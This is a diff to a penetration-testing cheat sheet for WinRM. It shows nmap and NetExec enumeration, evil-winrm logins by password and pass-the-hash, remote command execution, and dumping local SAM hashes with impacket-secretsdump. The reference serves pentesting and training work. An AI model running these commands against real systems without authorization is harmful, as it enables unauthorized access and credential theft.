@@ -23,61 +23,53 @@
 
 ## Enumeration
 
-### Port Scanning
-
-> WinRM ports: 5985 (HTTP), 5986 (HTTPS)
+### Quick Check (One-liner)
 
 ```shell
-nmap -p 5985,5986 -sV $rhost
+# Check WinRM + auth methods
+nmap -p 5985,5986 --script http-auth -sV $rhost && nxc winrm $rhost -u '' -p '' 2>/dev/null
 ```
 
-### Nmap Scripts
-
-> WinRM authentication enumeration
+### Nmap Scripts (One-liner)
 
 ```shell
-nmap -p 5985 --script http-auth $rhost
-```
-
-> Check if WinRM is enabled
-
-```shell
-nmap -p 5985,5986 --script wmi-* $rhost
+# All WinRM enumeration
+nmap -p 5985,5986 --script "http-auth,http-title" -sV $rhost
 ```
 
 ---
 
-## Connection
+## Connection (One-liner)
 
 ### Evil-WinRM
 
-> Connect with password
-
 ```shell
-evil-winrm -i $rhost -u $username -p $password
-```
+# Password auth
+evil-winrm -i $rhost -u $username -p '$password'
 
-> Connect with NTLM hash (Pass-the-Hash)
-
-```shell
+# Pass-the-Hash
 evil-winrm -i $rhost -u $username -H $ntlm_hash
+
+# With SSL (port 5986)
+evil-winrm -i $rhost -u $username -p '$password' -S
+
+# With scripts directory for post-exploitation
+evil-winrm -i $rhost -u $username -p '$password' -s /opt/privesc/ -e /opt/binaries/
 ```
 
-> Connect with Kerberos ticket
+### NetExec (One-liner)
 
 ```shell
-evil-winrm -i $rhost -r $domain
-```
+# Check credentials
+nxc winrm $rhost -u $username -p '$password'
 
-> Connect with SSL (port 5986)
+# Execute command
+nxc winrm $rhost -u $username -p '$password' -x 'whoami /all'
 
-```shell
-evil-winrm -i $rhost -u $username -p $password -S
-```
+# Execute PowerShell
+nxc winrm $rhost -u $username -p '$password' -X 'Get-Process'
 
-> Connect with custom scripts/binaries
-
-```shell
+# With scripts and binaries directory
 evil-winrm -i $rhost -u $username -p $password -s /path/to/scripts/ -e /path/to/binaries/
 ```
 
@@ -286,7 +278,7 @@ download C:\Windows\Temp\SYSTEM /tmp/SYSTEM
 > Extract hashes locally
 
 ```shell
-secretsdump.py -sam SAM -system SYSTEM LOCAL
+impacket-secretsdump -sam SAM -system SYSTEM LOCAL
 ```
 
 ### Persistence
